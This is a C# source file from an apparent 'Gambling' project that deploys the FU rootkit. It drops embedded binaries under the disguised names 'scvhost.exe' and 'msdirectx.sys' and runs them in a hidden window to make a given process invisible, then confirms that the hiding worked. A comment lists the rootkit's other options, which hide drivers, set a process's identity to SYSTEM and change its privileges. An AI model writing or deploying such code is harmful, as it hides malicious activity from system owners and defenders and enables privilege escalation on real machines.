using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace GR.Rootkit
{
    // https://www.rootkit.com/vault/fuzen_op/FU_README.txt

    /*
    C:\Users\Administrator\Desktop\Projects\Gambling\GRLibrary\GR.Rootkit\FUResources>fu
    Usage: fu
        [-pl]  #number   to list the first #number of processes
        [-ph]  #PID      to hide the process with #PID
        [-pld]           to list the named drivers in DbgView
        [-phd] DRIVER_NAME to hide the named driver
        [-pas] #PID      to set the AUTH_ID to SYSTEM on process #PID
        [-prl]           to list the available privileges
        [-prs] #PID #privilege_name to set privileges on process #PID
        [-pss] #PID #account_name to add #account_name SID to process #PID token
    */
    public class FU
    {
        public static bool Hide(int process_id)
        {
            File.WriteAllBytes("scvhost.exe", FUResources.fu);
            File.WriteAllBytes("msdirectx.sys", FUResources.msdirectx);

            try
            {
                // Check for excistance.
                Process.GetProcessById(process_id);

                ProcessStartInfo start_info = new ProcessStartInfo("scvhost.exe", "-ph " + process_id.ToString());

                start_info.CreateNoWindow = true;
                start_info.UseShellExecute = false;
                start_info.RedirectStandardError = true;
                start_info.RedirectStandardOutput = true;

                Process process = Process.Start(start_info);

                Thread.Sleep(5000);
                Console.WriteLine(process.StandardError.ReadToEnd());
                Console.WriteLine(process.StandardOutput.ReadToEnd());

                process.WaitForExit();
            }
            catch (ArgumentException e)
            {
                Console.WriteLine("FU trying to hide a process id which doesn't exists.");
                return false;
            }

            try
            {
                Process.GetProcessById(process_id);

                Console.WriteLine("Process still seen after FU Hide().");

                return false;
            }
            catch (ArgumentException e)
            {
                return true;
            }
        }
    }
}
